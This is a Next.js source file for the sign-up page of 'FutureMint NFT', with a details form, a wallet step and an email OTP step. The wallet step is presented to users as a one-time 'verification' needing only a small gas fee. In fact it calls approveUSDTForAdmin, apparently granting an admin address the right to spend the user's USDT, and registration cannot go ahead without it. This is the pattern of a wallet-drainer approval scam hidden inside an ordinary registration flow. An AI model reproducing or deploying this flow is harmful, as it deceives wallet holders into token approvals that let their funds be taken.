'use client';
import { useState, useEffect, Suspense } from 'react';
import { useSelector, useDispatch } from 'react-redux';
import { useRouter, useSearchParams } from 'next/navigation';
import Link from 'next/link';
import { authAPI } from '../../../lib/api';
import { loginSuccess } from '../../../store/slices/userSlice';
import LoadingSpinner from '../../../components/shared/LoadingSpinner';
import OTPInput from '../../../components/shared/OTPInput';
import { Eye, EyeOff, ArrowLeft, CheckCircle, Shield, Loader2, RefreshCw } from 'lucide-react';
import toast from 'react-hot-toast';

function RegisterContent() {
  const router = useRouter();
  const dispatch = useDispatch();
  const searchParams = useSearchParams();
  const { isConnected, address } = useSelector((s) => s.wallet);
  const { isAuthenticated } = useSelector((s) => s.user);

  // Steps: 1=form, 2=smart-contract, 3=otp, 4=success
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [otpLoading, setOtpLoading] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(0);

  const [form, setForm] = useState({
    name: '',
    email: '',
    mobile: '',
    password: '',
    referralCode: searchParams.get('ref') || '',
    network: 'BSC',
    walletAddress: address || '',
  });

  useEffect(() => {
    if (isAuthenticated) router.push('/dashboard');
  }, [isAuthenticated, router]);

  // Check if wallet is already registered
  useEffect(() => {
    if (isConnected && address) {
      authAPI.checkWallet({ walletAddress: address }).then((res) => {
        if (res.data.exists) {
          toast.error('This address is already registered. Please login instead.');
          router.push('/auth/login');
        }
      }).catch(() => {});
    }
  }, [isConnected, address, router]);

  // Redirect if no wallet connected
  useEffect(() => {
    const timer = setTimeout(() => {
      if (!isConnected && !window.ethereum?.selectedAddress) {
        toast.error('Please connect your wallet first');
        router.push('/');
      }
    }, 1500);
    return () => clearTimeout(timer);
  }, [isConnected, router]);

  // Sync wallet address
  useEffect(() => {
    setForm((f) => ({ ...f, walletAddress: address || '' }));
  }, [address]);

  // Resend cooldown timer
  useEffect(() => {
    if (resendCooldown <= 0) return;
    const timer = setInterval(() => setResendCooldown((c) => c - 1), 1000);
    return () => clearInterval(timer);
  }, [resendCooldown]);

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  // Step 1 → Step 2: Submit form, then go to smart contract step
  const handleFormSubmit = async (e) => {
    e.preventDefault();
    if (form.password.length < 8) {
      toast.error('Password must be at least 8 characters');
      return;
    }
    if (!form.name || !form.email || !form.mobile) {
      toast.error('Please fill all required fields');
      return;
    }
    // Move to smart contract step
    setStep(2);
  };

  // Step 2: Smart contract approval
  const handleSmartContract = async () => {
    setLoading(true);
    try {
      const { ethers } = await import('ethers');
      const { approveUSDTForAdmin, checkUSDTAllowance } = await import('../../../lib/web3');

      const injectedProvider = window.ethereum;
      if (!injectedProvider) {
        toast.error('Wallet app not detected. Please open in your wallet browser.');
        setLoading(false);
        return;
      }

      const network = form.network;
      const web3Provider = new ethers.BrowserProvider(injectedProvider);

      // Switch to correct network
      const targetChainId = network === 'BSC' ? '0x38' : '0x89';
      const targetChainName = network === 'BSC' ? 'BNB Smart Chain' : 'Polygon';
      try {
        await web3Provider.send('wallet_switchEthereumChain', [{ chainId: targetChainId }]);
      } catch (switchErr) {
        if (switchErr.code === 4902) {
          const chainConfig = network === 'BSC'
            ? { chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org'], blockExplorerUrls: ['https://bscscan.com'] }
            : { chainId: '0x89', chainName: 'Polygon', nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }, rpcUrls: ['https://polygon-rpc.com'], blockExplorerUrls: ['https://polygonscan.com'] };
          try {
            await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
          } catch (_) {
            toast.error(`Please add ${targetChainName} network manually.`);
            setLoading(false);
            return;
          }
        } else if (switchErr.code === 4001) {
          toast.error(`Please switch to ${targetChainName} to continue.`);
          setLoading(false);
          return;
        } else {
          toast.error(`Please switch to ${targetChainName} manually.`);
          setLoading(false);
          return;
        }
      }

      // Check if already approved
      const freshProvider = new ethers.BrowserProvider(injectedProvider);
      let alreadyApproved = false;
      try {
        const userAddress = ethers.getAddress(form.walletAddress.toLowerCase());
        alreadyApproved = await checkUSDTAllowance(userAddress, network);
      } catch (_) {}

      if (alreadyApproved === true) {
        // Already approved — skip to OTP
        toast.success('Already verified! Sending OTP...');
        await sendRegistrationOTP();
        return;
      }

      // Do approval
      toast.loading('Please confirm in your wallet...', { id: 'sc-approve' });
      await approveUSDTForAdmin(freshProvider, network);
      toast.success('Verified successfully!', { id: 'sc-approve' });

      // After smart contract success → send OTP
      await sendRegistrationOTP();
    } catch (err) {
      toast.dismiss('sc-approve');
      if (err.code === 4001 || err.code === 'ACTION_REJECTED') {
        toast.error('You need to confirm to proceed with registration.');
      } else if (err.message?.includes('insufficient funds')) {
        toast.error(`Insufficient ${form.network === 'BSC' ? 'BNB' : 'MATIC'} for gas fee.`);
      } else {
        toast.error(err.message || 'Something went wrong. Please try again.');
      }
    } finally {
      setLoading(false);
    }
  };

  // Call backend /register to store pending data and send OTP
  const sendRegistrationOTP = async () => {
    try {
      toast.loading('Sending verification code...', { id: 'send-otp' });
      await authAPI.register(form);
      toast.success('OTP sent to your email!', { id: 'send-otp' });
      setStep(3);
      setResendCooldown(60);
    } catch (err) {
      toast.dismiss('send-otp');
      const msg = err.response?.data?.message || 'Failed to send OTP';
      toast.error(msg);
      // If validation error, go back to form
      if (err.response?.status === 400 || err.response?.status === 409) {
        setStep(1);
      }
    } finally {
      setLoading(false);
    }
  };

  // Step 3: Verify OTP
  const handleOTPComplete = async (otp) => {
    setOtpLoading(true);
    try {
      const res = await authAPI.verifyOTP({ email: form.email.toLowerCase(), otp });
      const { user, token } = res.data.data;
      if (token) localStorage.setItem('token', token);
      dispatch(loginSuccess({ user, token }));
      toast.success('Account created successfully!');
      setStep(4);
      setTimeout(() => router.push('/dashboard'), 1500);
    } catch (err) {
      const msg = err.response?.data?.message || 'OTP verification failed';
      toast.error(msg);
    } finally {
      setOtpLoading(false);
    }
  };

  // Resend OTP
  const handleResendOTP = async () => {
    if (resendCooldown > 0) return;
    try {
      await authAPI.resendOTP({ email: form.email.toLowerCase(), purpose: 'verification' });
      toast.success('OTP resent to your email');
      setResendCooldown(60);
    } catch (err) {
      toast.error('Failed to resend OTP. Try again.');
    }
  };

  // Step 4: Success
  if (step === 4) {
    return (
      <div className="min-h-screen flex items-center justify-center px-4">
        <div className="card max-w-md w-full text-center">
          <div className="w-20 h-20 bg-emerald-600/20 rounded-full flex items-center justify-center mx-auto mb-6">
            <CheckCircle className="w-10 h-10 text-emerald-400" />
          </div>
          <h2 className="text-2xl font-bold text-white mb-3">Welcome to FutureMint!</h2>
          <p className="text-slate-400 mb-2">Your account is ready.</p>
          <p className="text-emerald-400 font-semibold text-lg mb-6">Redirecting to dashboard...</p>
        </div>
      </div>
    );
  }

  // Step 3: OTP Verification
  if (step === 3) {
    return (
      <div className="min-h-screen flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-md">
          <div className="card">
            <div className="text-center mb-6">
              <div className="w-16 h-16 bg-primary-600/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-primary-500/30">
                <Shield className="w-8 h-8 text-primary-400" />
              </div>
              <h2 className="text-xl font-bold text-white mb-2">Verify Your Email</h2>
              <p className="text-slate-400 text-sm">
                Enter the 6-digit code sent to <span className="text-primary-400 font-medium">{form.email}</span>
              </p>
            </div>

            <OTPInput length={6} onComplete={handleOTPComplete} disabled={otpLoading} />

            {otpLoading && (
              <div className="flex justify-center mt-6">
                <LoadingSpinner />
              </div>
            )}

            <div className="mt-6 text-center">
              <button
                onClick={handleResendOTP}
                disabled={resendCooldown > 0}
                className="text-sm text-slate-400 hover:text-primary-400 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2 mx-auto"
              >
                <RefreshCw className="w-4 h-4" />
                {resendCooldown > 0 ? `Resend in ${resendCooldown}s` : 'Resend OTP'}
              </button>
            </div>

            <p className="text-xs text-slate-600 text-center mt-4">
              Code expires in 10 minutes. Check spam folder if not received.
            </p>
          </div>
        </div>
      </div>
    );
  }

  // Step 2: Smart Contract Approval
  if (step === 2) {
    return (
      <div className="min-h-screen flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-md">
          <div className="card">
            <div className="text-center mb-6">
              <div className="w-16 h-16 bg-emerald-600/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-emerald-500/30">
                <Shield className="w-8 h-8 text-emerald-400" />
              </div>
              <h2 className="text-xl font-bold text-white mb-2">Verify Your Wallet</h2>
              <p className="text-slate-400 text-sm">
                Confirm a one-time verification on <span className="text-primary-400 font-semibold">{form.network}</span> network to activate your account.
              </p>
            </div>

            <div className="bg-dark-700/80 rounded-xl border border-dark-600 p-4 mb-6">
              <div className="flex items-center justify-between text-sm mb-2">
                <span className="text-slate-400">Network</span>
                <span className="text-white font-medium">{form.network === 'BSC' ? 'BNB Smart Chain' : 'Polygon'}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-slate-400">Wallet</span>
                <span className="text-white font-mono text-xs">{form.walletAddress?.slice(0, 8)}...{form.walletAddress?.slice(-6)}</span>
              </div>
            </div>

            <button
              onClick={handleSmartContract}
              disabled={loading}
              className="btn-primary w-full flex items-center justify-center gap-2"
            >
              {loading ? (
                <><Loader2 className="w-5 h-5 animate-spin" /> Confirming...</>
              ) : (
                <><Shield className="w-5 h-5" /> Confirm & Continue</>
              )}
            </button>

            <button
              onClick={() => setStep(1)}
              disabled={loading}
              className="w-full mt-3 text-sm text-slate-400 hover:text-white transition-colors text-center"
            >
              ← Back to form
            </button>

            <p className="text-xs text-slate-600 text-center mt-4">
              A small gas fee ({form.network === 'BSC' ? 'BNB' : 'MATIC'}) is required for verification.
            </p>
          </div>
        </div>
      </div>
    );
  }

  // Step 1: Registration Form
  return (
    <div className="min-h-screen flex items-center justify-center px-4 py-12">
      <div className="w-full max-w-lg">
        <div className="text-center mb-8">
          <Link href="/" className="inline-flex items-center gap-2 text-slate-400 hover:text-white mb-6 text-sm">
            <ArrowLeft className="w-4 h-4" /> Back to Home
          </Link>
          <h1 className="text-3xl font-bold text-white">Create Account</h1>
          <p className="text-slate-400 mt-2">Join FutureMint NFT and start earning</p>
        </div>

        {/* Progress Steps */}
        <div className="flex items-center justify-center gap-2 mb-6">
          {['Details', 'Verify Wallet', 'Email OTP'].map((label, i) => (
            <div key={label} className="flex items-center gap-2">
              <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold ${
                step > i + 1 ? 'bg-emerald-600 text-white' : step === i + 1 ? 'bg-primary-600 text-white' : 'bg-dark-700 text-slate-500'
              }`}>
                {step > i + 1 ? '✓' : i + 1}
              </div>
              <span className={`text-xs hidden sm:inline ${step === i + 1 ? 'text-white font-medium' : 'text-slate-500'}`}>{label}</span>
              {i < 2 && <div className={`w-6 sm:w-10 h-0.5 ${step > i + 1 ? 'bg-emerald-600' : 'bg-dark-700'}`} />}
            </div>
          ))}
        </div>

        <div className="card">
          <form onSubmit={handleFormSubmit} noValidate>
            <div className="space-y-4">
              <div>
                <label htmlFor="name" className="label">Full Name</label>
                <input id="name" name="name" type="text" required value={form.name}
                  onChange={handleChange} placeholder="John Doe" className="input-field" />
              </div>
              <div>
                <label htmlFor="email" className="label">Email Address</label>
                <input id="email" name="email" type="email" required value={form.email}
                  onChange={handleChange} placeholder="john@example.com" className="input-field" />
              </div>
              <div>
                <label htmlFor="mobile" className="label">Mobile Number</label>
                <input id="mobile" name="mobile" type="tel" required value={form.mobile}
                  onChange={handleChange} placeholder="+1234567890" className="input-field" />
              </div>
              <div>
                <label htmlFor="password" className="label">Password</label>
                <div className="relative">
                  <input id="password" name="password"
                    type={showPassword ? 'text' : 'password'}
                    required minLength={8} value={form.password}
                    onChange={handleChange} placeholder="Min. 8 characters"
                    className="input-field pr-12" />
                  <button type="button" onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white"
                    aria-label={showPassword ? 'Hide password' : 'Show password'}>
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>
              <div>
                <label htmlFor="network" className="label">Network</label>
                <select id="network" name="network" value={form.network}
                  onChange={handleChange} className="input-field">
                  <option value="BSC">BSC (BEP-20 USDT)</option>
                  <option value="Polygon">Polygon (USDT)</option>
                </select>
              </div>
              <div>
                <label htmlFor="referralCode" className="label">
                  Referral Code <span className="text-slate-500">(Optional)</span>
                </label>
                <input id="referralCode" name="referralCode" type="text"
                  value={form.referralCode} onChange={handleChange}
                  placeholder="Enter referral code" className="input-field uppercase"
                  style={{ textTransform: 'uppercase' }} />
              </div>
              <div>
                <label htmlFor="walletAddress" className="label">
                  Wallet Address <span className="text-slate-500">(Auto-filled)</span>
                </label>
                <input id="walletAddress" name="walletAddress" type="text"
                  value={form.walletAddress} readOnly
                  className="input-field opacity-70 cursor-not-allowed" />
              </div>
            </div>

            <button type="submit" className="btn-primary w-full mt-6">
              Continue
            </button>

            <p className="text-center text-sm text-slate-400 mt-4">
              Already have an account?{' '}
              <Link href="/auth/login" className="text-primary-400 hover:text-primary-300">Sign in</Link>
            </p>
          </form>
        </div>
      </div>
    </div>
  );
}

export default function RegisterPage() {
  return (
    <Suspense fallback={<div className="min-h-screen flex items-center justify-center"><LoadingSpinner size="xl" /></div>}>
      <RegisterContent />
    </Suspense>
  );
}
